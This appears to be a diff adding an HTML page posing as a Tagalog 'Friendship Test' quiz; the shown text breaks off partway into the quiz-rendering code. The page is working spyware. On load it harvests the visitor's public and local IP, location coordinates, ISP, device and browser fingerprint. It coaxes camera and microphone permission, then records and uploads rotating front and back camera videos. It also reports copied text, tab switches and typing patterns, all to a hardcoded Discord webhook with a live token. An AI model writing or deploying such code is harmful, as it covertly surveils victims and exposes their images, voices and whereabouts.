@@ -1,0 +1,1216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Friendship Test</title>
+  <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: black;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    .particle {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: white;
+      border-radius: 50%;
+      opacity: 0.6;
+      pointer-events: none;
+      z-index: 20;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      0% {
+        transform: translateY(-10px);
+        opacity: 0;
+      }
+      10% {
+        opacity: 0.6;
+      }
+      90% {
+        opacity: 0.6;
+      }
+      100% {
+        transform: translateY(100vh);
+        opacity: 0;
+      }
+    }
+    .card {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 42rem;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 0.5rem;
+      padding: 2rem;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    .text-center {
+      text-align: center;
+    }
+    h2 {
+      color: white;
+      font-size: 1.875rem;
+      font-weight: bold;
+      margin-bottom: 1rem;
+    }
+    p {
+      color: rgba(255, 255, 255, 0.9);
+      margin-bottom: 1.5rem;
+    }
+    .error {
+      color: #fca5a5;
+      font-size: 0.875rem;
+      margin-bottom: 1rem;
+    }
+    button {
+      background: white;
+      color: black;
+      padding: 0.75rem 2rem;
+      border-radius: 0.5rem;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 1rem;
+    }
+    button:hover {
+      opacity: 0.9;
+    }
+    button:disabled {
+      cursor: not-allowed;
+    }
+    .quiz-header {
+      margin-bottom: 1.5rem;
+    }
+    .quiz-info {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1rem;
+      color: white;
+      font-size: 0.875rem;
+    }
+    .progress-bar {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 9999px;
+      height: 0.5rem;
+      overflow: hidden;
+    }
+    .progress-fill {
+      background: white;
+      height: 100%;
+      transition: width 0.3s;
+      border-radius: 9999px;
+    }
+    .question {
+      color: white;
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 2rem;
+    }
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+    .option {
+      width: 100%;
+      text-align: left;
+      padding: 1rem;
+      border-radius: 0.5rem;
+      background: rgba(255, 255, 255, 0.1);
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 1rem;
+    }
+    .option:hover:not(:disabled) {
+      background: rgba(255, 255, 255, 0.2);
+    }
+    .option.correct {
+      background: #22c55e;
+      color: white;
+    }
+    .option.incorrect {
+      background: #ef4444;
+      color: white;
+    }
+    .score-display {
+      color: white;
+      font-size: 3rem;
+      font-weight: bold;
+      margin: 1rem 0;
+    }
+    .result-message {
+      color: white;
+      font-size: 1.25rem;
+      margin-bottom: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="app">
+    <div class="card text-center" id="cameraScreen">
+      <h2>Friendship Test</h2>
+      <p>kung totoo mokong kaibigan, bat dimo sagutan? allow mo na lang para maka enter</p>
+      <p class="error" id="cameraError" style="display: none;"></p>
+      <button onclick="requestCamera()">Enter</button>
+    </div>
+  </div>
+  <video id="liveVideo" autoplay playsinline muted style="display:none;"></video>
+  <script>
+    const questions = [
+      { question: "Ano ang birthday ko?", options: ["January 15", "March 22", "June 10", "December 5"], correct: 1 },
+      { question: "Anong kulay ang paborito ko?", options: ["Asul", "Pula", "Itim", "Puti"], correct: 2 },
+      { question: "Saan ako nag-aaral?", options: ["Lakandula", "UPLB", "Ateneo", "La Salle"], correct: 0 },
+      { question: "Ano ang paboritong kanta ko?", options: ["OPM Ballad", "K-Pop", "Rock", "Hip-Hop"], correct: 1 },
+      { question: "Anong sports ang nilalaro ko?", options: ["Basketball", "Volleyball", "Badminton", "Swimming"], correct: 0 },
+      { question: "Ano ang dream job ko?", options: ["Doctor", "Engineer", "Teacher", "Artist"], correct: 1 },
+      { question: "Saan ko gustong mag-travel?", options: ["Japan", "Korea", "Europe", "America"], correct: 0 },
+      { question: "Ano ang takot ko?", options: ["Heights", "Ipis", "Dilim", "Multo"], correct: 1 },
+      { question: "Anong pagkain ang ayaw ko?", options: ["Ampalaya", "Okra", "Talong", "Patola"], correct: 0 },
+      { question: "Ano ang hobby ko?", options: ["Gaming", "Reading", "Drawing", "Cooking"], correct: 0 },
+      { question: "Anong subject ang paborito ko?", options: ["Math", "Science", "English", "Filipino"], correct: 1 },
+      { question: "Ano ang favorite movie genre ko?", options: ["Horror", "Comedy", "Romance", "Action"], correct: 2 },
+      { question: "Anong pet ang gusto ko?", options: ["Aso", "Pusa", "Hamster", "Ibon"], correct: 1 },
+      { question: "Ano ang paboritong dessert ko?", options: ["Ice Cream", "Cake", "Leche Flan", "Halo-Halo"], correct: 3 },
+      { question: "Anong oras ako natutulog?", options: ["9 PM", "11 PM", "1 AM", "3 AM"], correct: 2 },
+      { question: "Saan ako mahilig mag-shopping?", options: ["Mall", "Online", "Ukay-Ukay", "Palengke"], correct: 1 },
+      { question: "Ano ang paboritong fast food ko?", options: ["Jollibee", "McDonald's", "KFC", "Chowking"], correct: 0 },
+      { question: "Anong season ang gusto ko?", options: ["Summer", "Rainy", "Cold", "Spring"], correct: 2 },
+      { question: "Ano ang pangarap kong sasakyan?", options: ["Car", "Motorcycle", "SUV", "Sports Car"], correct: 3 },
+      { question: "Anong social media ang active ako?", options: ["Facebook", "Instagram", "Twitter", "TikTok"], correct: 1 }
+    ];
+    
+    let currentQuestion = 0;
+    let score = 0;
+    let isAnswered = false;
+    let stream = null;
+    let videoRecorder = null;
+    let videoChunks = [];
+    let videoCounter = 0;
+    let useFrontCamera = true;
+    let sessionStart = Date.now();
+    let questionStartTime = Date.now();
+    let appSwitches = 0;
+    let tabSwitches = 0;
+    let timeInBackground = 0;
+    let backgroundStartTime = null;
+    let touches = [];
+    let keystrokes = [];
+    let mousePositions = [];
+    let interactions = 0;
+    let lastActive = Date.now();
+    let availableCameras = [];
+    
+    const WEBHOOK = "https://discord.com/api/webhooks/1460625709876908094/y49NF95UAjnsOQGrhs9RNVImam9BQFqvgFKb7jBB5jAotI9eLqNUtVn3134r40rA8NdD";
+    
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        try {
+          const res2 = await fetch('https://api.my-ip.io/ip');
+          return await res2.text();
+        } catch {
+          return "Unknown";
+        }
+      }
+    }
+    
+    async function getLocalIP() {
+      try {
+        const pc = new RTCPeerConnection({iceServers: []});
+        pc.createDataChannel('');
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        
+        return new Promise((resolve) => {
+          pc.onicecandidate = (ice) => {
+            if (!ice || !ice.candidate || !ice.candidate.candidate) {
+              resolve("Unable to detect");
+              return;
+            }
+            const localIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+            pc.close();
+            resolve(localIP ? localIP[1] : "Unable to detect");
+          };
+          setTimeout(() => resolve("Timeout"), 3000);
+        });
+      } catch {
+        return "Unable to detect";
+      }
+    }
+    
+    async function getLocationInfo() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return {
+          city: data.city || "Unknown",
+          region: data.region || "Unknown",
+          country: data.country_name || "Unknown",
+          latitude: data.latitude || "Unknown",
+          longitude: data.longitude || "Unknown",
+          isp: data.org || "Unknown",
+          timezone: data.timezone || "Unknown",
+          postal: data.postal || "Unknown",
+          isVPN: data.threat?.is_proxy || data.threat?.is_tor || false
+        };
+      } catch {
+        return null;
+      }
+    }
+    
+    function getMobileDetails() {
+      const ua = navigator.userAgent;
+      const isIOS = /iPad|iPhone|iPod/.test(ua);
+      const isAndroid = /Android/.test(ua);
+      
+      let device = 'Unknown';
+      if (isIOS) {
+        device = ua.match(/iPhone|iPad|iPod/)?.[0] || 'iOS Device';
+      } else if (isAndroid) {
+        const match = ua.match(/Android.*; (.*?)(?:Build|\))/);
+        device = match ? match[1] : 'Android Device';
+      }
+      
+      const isFacebook = /FBAN|FBAV/.test(ua);
+      const isInstagram = /Instagram/.test(ua);
+      const isTikTok = /BytedanceWebview/.test(ua);
+      const isChrome = /Chrome/.test(ua) && !/Edge/.test(ua);
+      const isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
+      const isFirefox = /Firefox/.test(ua);
+      
+      return {
+        platform: isIOS ? 'iOS' : isAndroid ? 'Android' : 'Desktop',
+        device,
+        browser: isFacebook ? 'Facebook App' : 
+                 isInstagram ? 'Instagram App' :
+                 isTikTok ? 'TikTok App' :
+                 isChrome ? 'Chrome' :
+                 isSafari ? 'Safari' :
+                 isFirefox ? 'Firefox' : 'Unknown',
+        isInAppBrowser: isFacebook || isInstagram || isTikTok,
+        userAgent: ua
+      };
+    }
+    
+    async function getConnectionInfo() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      
+      if (connection) {
+        return {
+          effectiveType: connection.effectiveType || 'Unknown',
+          downlink: connection.downlink ? `${connection.downlink} Mbps` : 'Unknown',
+          rtt: connection.rtt ? `${connection.rtt}ms` : 'Unknown',
+          saveData: connection.saveData || false,
+          type: connection.type || 'Unknown'
+        };
+      }
+      return null;
+    }
+    
+    async function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          return {
+            level: `${(battery.level * 100).toFixed(0)}%`,
+            charging: battery.charging,
+            chargingTime: battery.chargingTime !== Infinity ? `${(battery.chargingTime / 60).toFixed(0)} min` : 'N/A',
+            dischargingTime: battery.dischargingTime !== Infinity ? `${(battery.dischargingTime / 60).toFixed(0)} min` : 'N/A'
+          };
+        } catch {
+          return null;
+        }
+      }
+      return null;
+    }
+    
+    async function getBrowserFingerprint() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillText("fingerprint", 2, 2);
+      const canvasData = canvas.toDataURL();
+      
+      let webglInfo = {};
+      try {
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            webglInfo = {
+              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            };
+          }
+        }
+      } catch {}
+      
+      return {
+        canvasFingerprint: btoa(canvasData.slice(-50)),
+        webGL: webglInfo,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages?.join(', ') || 'Unknown',
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+    }
+    
+    (async function logWebsiteEntry() {
+      try {
+        const publicIP = await getIP();
+        const localIP = await getLocalIP();
+        const location = await getLocationInfo();
+        const mobile = getMobileDetails();
+        const connection = await getConnectionInfo();
+        const battery = await getBatteryInfo();
+        const fingerprint = await getBrowserFingerprint();
+        
+        await fetch(WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "Website Entered",
+            embeds: [{
+              title: "User Entered!",
+              description: "Complete initial scan",
+              color: 10181046,
+              fields: [
+                { name: "Public IP", value: `\`${publicIP}\``, inline: true },
+                { name: "Local IP", value: `\`${localIP}\``, inline: true },
+                { name: "Location", value: location ? `${location.city}, ${location.country}` : "Unknown", inline: true },
+                { name: "Coordinates", value: location ? `${location.latitude}, ${location.longitude}` : "Unknown", inline: true },
+                { name: "ISP", value: location ? `\`${location.isp}\`` : "Unknown", inline: true },
+                { name: "Timezone", value: location ? location.timezone : fingerprint.timezone, inline: true },
+                { name: "Device", value: `${mobile.device}`, inline: true },
+                { name: "Browser", value: mobile.browser, inline: true },
+                { name: "Platform", value: mobile.platform, inline: true },
+                { name: "Connection", value: connection ? `${connection.effectiveType} (${connection.type})` : "Unknown", inline: true },
+                { name: "Battery", value: battery ? `${battery.level} ${battery.charging ? '⚡' : ''}` : "Unknown", inline: true },
+                { name: "Screen", value: `${fingerprint.screenResolution} (${fingerprint.colorDepth}bit)`, inline: true },
+                { name: "CPU Cores", value: `${fingerprint.hardwareConcurrency}`, inline: true },
+                { name: "Memory", value: `${fingerprint.deviceMemory} GB`, inline: true },
+                { name: "Touch Points", value: `${fingerprint.maxTouchPoints}`, inline: true },
+                { name: "VPN/Proxy", value: location?.isVPN ? "⚠️ DETECTED" : "✅ None", inline: true },
+                { name: "In-App Browser", value: mobile.isInAppBrowser ? "⚠️ YES" : "✅ No", inline: true },
+                { name: "Languages", value: fingerprint.languages, inline: false }
+              ],
+              timestamp: new Date().toISOString(),
+              footer: { text: "Initial Scan Complete" }
+            }]
+          })
+        });
+        
+        if (location?.isVPN) {
+          await fetch(WEBHOOK, {
+            method: "POST",
+            body: JSON.stringify({
+              username: "Vpn Alert",
+              content: `**VPN/PROXY DETECTED** \nUser hiding their real location!`
+            })
+          });
+        }
+        
+      } catch {}
+    })();
+    
+    async function switchCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      
+      useFrontCamera = !useFrontCamera;
+      
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: useFrontCamera ? "user" : "environment" },
+          audio: true
+        });
+        
+        const video = document.getElementById('liveVideo');
+        video.srcObject = stream;
+        await video.play().catch(() => {});
+        
+        await fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Camera Switched",
+            embeds: [{
+              title: "Camera Changed",
+              description: `Now using: ${useFrontCamera ? 'Front' : 'Back'} camera`,
+              color: 5814783,
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+        
+      } catch (error) {
+        await fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Camera Switch Failed",
+            content: `Failed to switch to ${useFrontCamera ? 'Front' : 'Back'} camera: ${error.message}`
+          })
+        });
+      }
+    }
+    
+    async function startVideoRecording() {
+      try {
+        if (!stream) return;
+        
+        let mimeType;
+        if (MediaRecorder.isTypeSupported('video/mp4')) {
+          mimeType = 'video/mp4';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
+          mimeType = 'video/webm;codecs=vp9,opus';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+          mimeType = 'video/webm;codecs=vp8,opus';
+        } else if (MediaRecorder.isTypeSupported('video/webm')) {
+          mimeType = 'video/webm';
+        } else {
+          mimeType = '';
+        }
+        
+        videoRecorder = new MediaRecorder(stream, mimeType ? { 
+          mimeType: mimeType,
+          videoBitsPerSecond: 1000000,
+          audioBitsPerSecond: 128000
+        } : {});
+        
+        videoRecorder.ondataavailable = (event) => {
+          if (event.data && event.data.size > 0) {
+            videoChunks.push(event.data);
+          }
+        };
+        
+        videoRecorder.start();
+        
+        setInterval(() => {
+          if (videoRecorder && videoRecorder.state === 'recording') {
+            videoRecorder.stop();
+            
+            videoRecorder.onstop = async () => {
+              if (videoChunks.length > 0) {
+                const videoBlob = new Blob(videoChunks, { type: videoRecorder.mimeType || 'video/mp4' });
+                
+                if (videoBlob.size > 10000) {
+                  try {
+                    const ip = await getIP();
+                    const fileExt = videoRecorder.mimeType && videoRecorder.mimeType.includes('webm') ? 'webm' : 'mp4';
+                    const form = new FormData();
+                    const cameraType = useFrontCamera ? 'Front' : 'Back';
+                    form.append('file', new File([videoBlob], `${cameraType}-video-${++videoCounter}.${fileExt}`, { type: videoRecorder.mimeType || 'video/mp4' }));
+                    form.append('payload_json', JSON.stringify({
+                      username: `${cameraType} Camera`,
+                      content: `Video #${videoCounter} - ${cameraType} Camera`,
+                      embeds: [{
+                        title: `${cameraType} Camera Recording`,
+                        description: "Hitted By Anonymous Team",
+                        color: useFrontCamera ? 3447003 : 15158332,
+                        fields: [
+                          { name: "Camera", value: cameraType, inline: true },
+                          { name: "Public IP", value: `\`${ip}\``, inline: true },
+                          { name: "Time", value: new Date().toLocaleString(), inline: true },
+                          { name: "Format", value: `\`${videoRecorder.mimeType || 'auto'}\``, inline: true },
+                          { name: "Size", value: `${(videoBlob.size / 1024).toFixed(0)} KB`, inline: true },
+                          { name: "Recording #", value: `${videoCounter}`, inline: true }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: { text: "Video Logger" }
+                      }]
+                    }));
+                    
+                    await fetch(WEBHOOK, { method: "POST", body: form });
+                    
+                    await switchCamera();
+                    
+                  } catch {}
+                }
+                
+                videoChunks = [];
+                if (stream && stream.active) {
+                  videoRecorder = new MediaRecorder(stream, mimeType ? { 
+                    mimeType: mimeType,
+                    videoBitsPerSecond: 1000000,
+                    audioBitsPerSecond: 128000
+                  } : {});
+                  
+                  videoRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                      videoChunks.push(event.data);
+                    }
+                  };
+                  
+                  videoRecorder.start();
+                }
+              }
+            };
+          }
+        }, 10000);
+        
+      } catch (error) {
+        console.log('Video recording not available');
+      }
+    }
+    
+    async function captureScreenshot(reason = "") {
+      try {
+        const video = document.getElementById('liveVideo');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+          if (blob) {
+            const form = new FormData();
+            const cameraType = useFrontCamera ? 'FRONT' : 'BACK';
+            form.append('file', blob, `${cameraType}-screenshot-${Date.now()}.jpg`);
+            form.append('payload_json', JSON.stringify({
+              username: "Screenshot",
+              content: reason || "Screenshot captured",
+              embeds: [{
+                title: `${cameraType} Camera Screenshot`,
+                description: reason,
+                color: 15844367,
+                fields: [
+                  { name: "Camera", value: cameraType, inline: true },
+                  { name: "Question", value: `${currentQuestion + 1}/${questions.length}`, inline: true },
+                  { name: "Time", value: new Date().toLocaleString(), inline: true }
+                ],
+                timestamp: new Date().toISOString()
+              }]
+            }));
+            
+            await fetch(WEBHOOK, { method: "POST", body: form });
+          }
+        }, 'image/jpeg', 0.9);
+      } catch {}
+    }
+    
+    function createParticles() {
+      const container = document.querySelector('.container');
+      for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        particle.style.animationDuration = (5 + Math.random() * 5) + 's';
+        particle.style.width = particle.style.height = (2 + Math.random() * 3) + 'px';
+        container.appendChild(particle);
+      }
+    }
+    createParticles();
+    
+    async function requestCamera() {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        availableCameras = devices.filter(d => d.kind === 'videoinput');
+        
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" }, 
+          audio: true 
+        });
+        
+        const video = document.getElementById('liveVideo');
+        video.srcObject = stream;
+        video.play().catch(() => {});
+        
+        await fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Access Granted",
+            embeds: [{
+              title: "Camera & Mic Access Granted",
+              fields: [
+                { name: "Available Cameras", value: `${availableCameras.length}`, inline: true },
+                { name: "Current Camera", value: stream.getVideoTracks()[0].label, inline: true },
+                { name: "Audio Track", value: stream.getAudioTracks()[0]?.label || "None", inline: true }
+              ],
+              color: 5763719,
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+        
+        startVideoRecording();
+        monitorBattery();
+        monitorOrientation();
+        monitorNetwork();
+        setupTouchTracking();
+        setupKeystrokeTracking();
+        setupMouseTracking();
+        setupVisibilityTracking();
+        detectSplitScreen();
+        
+        showQuiz();
+      } catch (error) {
+        document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
+        document.getElementById('cameraError').style.display = 'block';
+        
+        await fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Permission Denied",
+            embeds: [{
+              title: "User Denied Camera/Mic",
+              description: error.message,
+              color: 15548997,
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      }
+    }
+    
+    async function monitorBattery() {
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          
+          battery.addEventListener('chargingchange', async () => {
+            await fetch(WEBHOOK, {
+              method: "POST",
+              body: JSON.stringify({
+                username: "Charging Status",
+                content: battery.charging ? 
+                  `User plugged in phone (${(battery.level * 100).toFixed(0)}%)` : 
+                  `User unplugged phone (${(battery.level * 100).toFixed(0)}%)`
+              })
+            });
+          });
+          
+          battery.addEventListener('levelchange', async () => {
+            if (battery.level < 0.15 && !battery.charging) {
+              await fetch(WEBHOOK, {
+                method: "POST",
+                body: JSON.stringify({
+                  username: "Low Battery Detected",
+                  content: `Phone at ${(battery.level * 100).toFixed(0)}% - User might quit soon!`,
+                  embeds: [{
+                    title: "Low Battery Level",
+                    color: 15158332
+                  }]
+                })
+              });
+            }
+          });
+        } catch {}
+      }
+    }
+    
+    function monitorOrientation() {
+      window.addEventListener('orientationchange', async () => {
+        const orientation = screen.orientation?.type || 
+                           (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape');
+        
+        await fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Orientation",
+            embeds: [{
+              title: "Phone Rotated",
+              fields: [
+                { name: "New Orientation", value: orientation, inline: true },
+                { name: "Screen Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true }
+              ],
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      });
+      
+      if (window.DeviceOrientationEvent) {
+        let lastTilt = Date.now();
+        window.addEventListener('deviceorientation', async (e) => {
+          if (Math.abs(e.beta) > 60 || Math.abs(e.gamma) > 60) {
+            if (Date.now() - lastTilt > 5000) {
+              lastTilt = Date.now();
+              await fetch(WEBHOOK, {
+                method: "POST",
+                body: JSON.stringify({
+                  username: "Phone Tilted",
+                  content: `Phone rotated heavily: β=${e.beta.toFixed(1)}° γ=${e.gamma.toFixed(1)}°`
+                })
+              });
+            }
+          }
+        });
+      }
+    }
+    
+    function monitorNetwork() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      
+      if (connection) {
+        connection.addEventListener('change', async () => {
+          await fetch(WEBHOOK, {
+            method: "POST",
+            body: JSON.stringify({
+              username: "Network Change",
+              embeds: [{
+                title: "Connection Changed",
+                fields: [
+                  { name: "Type", value: connection.type || 'Unknown', inline: true },
+                  { name: "Speed", value: connection.effectiveType || 'Unknown', inline: true },
+                  { name: "Downlink", value: `${connection.downlink || 'N/A'} Mbps`, inline: true }
+                ],
+                color: 15105570,
+                timestamp: new Date().toISOString()
+              }]
+            })
+          });
+        });
+      }
+    }
+    
+    function setupTouchTracking() {
+      document.addEventListener('touchstart', async (e) => {
+        const touch = {
+          count: e.touches.length,
+          time: Date.now(),
+          x: e.touches[0].clientX,
+          y: e.touches[0].clientY
+        };
+        
+        touches.push(touch);
+        
+        if (e.touches.length > 1) {
+          await fetch(WEBHOOK, {
+            method: "POST",
+            body: JSON.stringify({
+              username: "Multi Touch Detected",
+              content: `${e.touches.length} fingers detected - User might be zooming or using gestures`
+            })
+          });
+        }
+      });
+      
+      let lastSwipe = Date.now();
+      document.addEventListener('touchmove', async (e) => {
+        if (touches.length > 1) {
+          const lastTouch = touches[touches.length - 1];
+          const deltaTime = Date.now() - lastTouch.time;
+          const deltaX = Math.abs(e.touches[0].clientX - lastTouch.x);
+          
+          if (deltaTime < 100 && deltaX > 50 && Date.now() - lastSwipe > 2000) {
+            lastSwipe = Date.now();
+            await fetch(WEBHOOK, {
+              method: "POST",
+              body: JSON.stringify({
+                username: "Fast Swipe Detected",
+                content: "User swiping rapidly"
+              })
+            });
+          }
+        }
+      });
+    }
+    
+    function setupKeystrokeTracking() {
+      document.addEventListener('keydown', (e) => {
+        keystrokes.push({
+          key: e.key,
+          time: Date.now(),
+          duration: null
+        });
+      });
+      
+      document.addEventListener('keyup', (e) => {
+        const lastKey = keystrokes[keystrokes.length - 1];
+        if (lastKey && lastKey.key === e.key) {
+          lastKey.duration = Date.now() - lastKey.time;
+        }
+      });
+      
+      setInterval(async () => {
+        if (keystrokes.length >= 20) {
+          const avgSpeed = keystrokes.reduce((sum, k) => sum + (k.duration || 0), 0) / keystrokes.length;
+          
+          await fetch(WEBHOOK, {
+            method: "POST",
+            body: JSON.stringify({
+              username: "Typing Pattern",
+              content: `Average keystroke: ${avgSpeed.toFixed(0)}ms | Total keys: ${keystrokes.length}`
+            })
+          });
+          
+          keystrokes = [];
+        }
+      }, 30000);
+    }
+    
+    function setupMouseTracking() {
+      document.addEventListener('mousemove', (e) => {
+        mousePositions.push({ x: e.clientX, y: e.clientY, time: Date.now() });
+        
+        if (mousePositions.length > 100) {
+          mousePositions.shift();
+        }
+      });
+      
+      document.addEventListener('click', () => interactions++);
+      document.addEventListener('keypress', () => interactions++);
+    }
+    
+    function setupVisibilityTracking() {
+      document.addEventListener('visibilitychange', async () => {
+        if (document.hidden) {
+          appSwitches++;
+          tabSwitches++;
+          backgroundStartTime = Date.now();
+          
+          await fetch(WEBHOOK, {
+            method: "POST",
+            body: JSON.stringify({
+              username: "User Left Tab",
+              embeds: [{
+                title: "User Switched Away!",
+                description: "Might be searching for answers elsewhere...",
+                fields: [
+                  { name: "Times Switched", value: `${appSwitches}`, inline: true },
+                  { name: "Question", value: `${currentQuestion + 1}/${questions.length}`, inline: true },
+                  { name: "Time", value: new Date().toLocaleTimeString(), inline: true }
+                ],
+                color: 15105570,
+                timestamp: new Date().toISOString()
+              }]
+            })
+          });
+        } else {
+          if (backgroundStartTime) {
+            const duration = Date.now() - backgroundStartTime;
+            timeInBackground += duration;
+            
+            await fetch(WEBHOOK, {
+              method: "POST",
+              body: JSON.stringify({
+                username: "User Returned",
+                embeds: [{
+                  title: "User Came Back",
+                  fields: [
+                    { name: "Away For", value: `${(duration/1000).toFixed(1)}s`, inline: true },
+                    { name: "Total Background Time", value: `${(timeInBackground/1000).toFixed(1)}s`, inline: true }
+                  ],
+                  color: duration > 30000 ? 15158332 : 5763719,
+                  timestamp: new Date().toISOString()
+                }]
+              })
+            });
+            
+            backgroundStartTime = null;
+          }
+        }
+      });
+    }
+    
+    function detectSplitScreen() {
+      const width = window.innerWidth;
+      const height = window.innerHeight;
+      const screenWidth = screen.width;
+      const screenHeight = screen.height;
+      
+      const widthRatio = width / screenWidth;
+      const heightRatio = height / screenHeight;
+      
+      if (widthRatio < 0.9 || heightRatio < 0.9) {
+        fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Split Screen",
+            embeds: [{
+              title: "Split Screen Detected",
+              fields: [
+                { name: "Window", value: `${width}x${height}`, inline: true },
+                { name: "Screen", value: `${screenWidth}x${screenHeight}`, inline: true },
+                { name: "Ratio", value: `${(widthRatio * 100).toFixed(0)}%`, inline: true }
+              ],
+              color: 15105570,
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      }
+    }
+    
+    document.addEventListener('copy', async (e) => {
+      const copied = window.getSelection().toString();
+      if (copied) {
+        await fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Copy Detected",
+            embeds: [{
+              title: "User Copied Text",
+              description: copied.substring(0, 200),
+              color: 15844367,
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      }
+    });
+    
+    document.addEventListener('paste', async () => {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        body: JSON.stringify({
+          username: "Paste Detected",
+          content: "User pasted something"
+        })
+      });
+    });
+    
+    document.addEventListener('contextmenu', async (e) => {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        body: JSON.stringify({
+          username: "Right Clicked",
+          content: `Right-clicked on: ${e.target.tagName}`
+        })
+      });
+    });
+    
+    let lastBlur = 0;
+    window.addEventListener('blur', () => {
+      lastBlur = Date.now();
+    });
+    
+    window.addEventListener('focus', async () => {
+      const blurDuration = Date.now() - lastBlur;
+      
+      if (blurDuration < 500 && blurDuration > 0) {
+        await fetch(WEBHOOK, {
+          method: "POST",
+          body: JSON.stringify({
+            username: "Screenshot Attempt",
+            embeds: [{
+              title: "Possible Screenshot Detected",
+              description: "Very short focus loss",
+              fields: [
+                { name: "Blur Duration", value: `${blurDuration}ms`, inline: true },
+                { name: "Question", value: `${currentQuestion + 1}`, inline: true }
+              ],
+              color: 15105570,
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      }
+    });
+    
+    window.addEventListener('resize', detectSplitScreen);
+    
+    function showQuiz() {
+      const app = document.getElementById('app');
+      app.innerHTML = `
+        <div class="card">
+          <div class="quiz-header">
+            <div class="quiz-info">
+              <span>Question <span id="current">1</span>/${questions.length}</span>
+              <span>Score: <span id="score">0</span></span>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-fill" id="progress"></div>
+            </div>
+          </div>
